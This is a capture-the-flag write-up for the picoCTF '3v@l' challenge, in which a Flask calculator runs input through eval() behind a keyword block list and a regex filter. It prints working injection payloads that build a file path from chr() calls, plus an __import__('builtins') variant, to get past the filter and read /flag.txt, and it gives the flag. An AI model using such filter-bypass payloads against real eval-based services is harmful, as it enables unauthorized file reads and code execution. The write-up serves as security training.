# 3v@l
- [Challenge information](#challenge-information)
- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)
- [Reference](#reference)
## Challenge information
```text
Tags: Web Explotation, picoCTF 2025, browser_webshell_solvable

Description:  
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

Hints:
1. Bypass regex
2. The flag file is /flag.txt
3. You might need encoding or dynamic construction to bypass restrictions.
```
## Overview
### A web executes what we type
![alt text](/CTF/picoCTF/Static/Images/3v@l/image.png)
## Solution
**Step1:** Recon  
* Based on the description, we can see that the web uses the `eval()` function to calculate what we enter.  
* After viewing the source i can see the web is giving us filtered characters and letters  
```
  Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
```
**Step2:** Exploit  
* Web uses blacklists to block harmful characters, but that's not enough.  
* The simplest way is to concatenate strings to read flags, combined with using Unicode.  
`open(chr(47)+'f'+'l'+'a'+'g'+'.'+'t'+'x'+'t').read()`
## Flag
`picoCTF{D0nt_Use_Unsecure_f@nctions0c312090}`
## Reference
* Nếu sandbox chặn open trực tiếp hoặc chặn dấu (/)/+ kiểu đó, phương án thay thế an toàn là dùng __import__('builtins').open(...):
`__import__('builtins').open(''.join(map(chr,[47,102,108,97,103,46,116,120,116]))).read()
`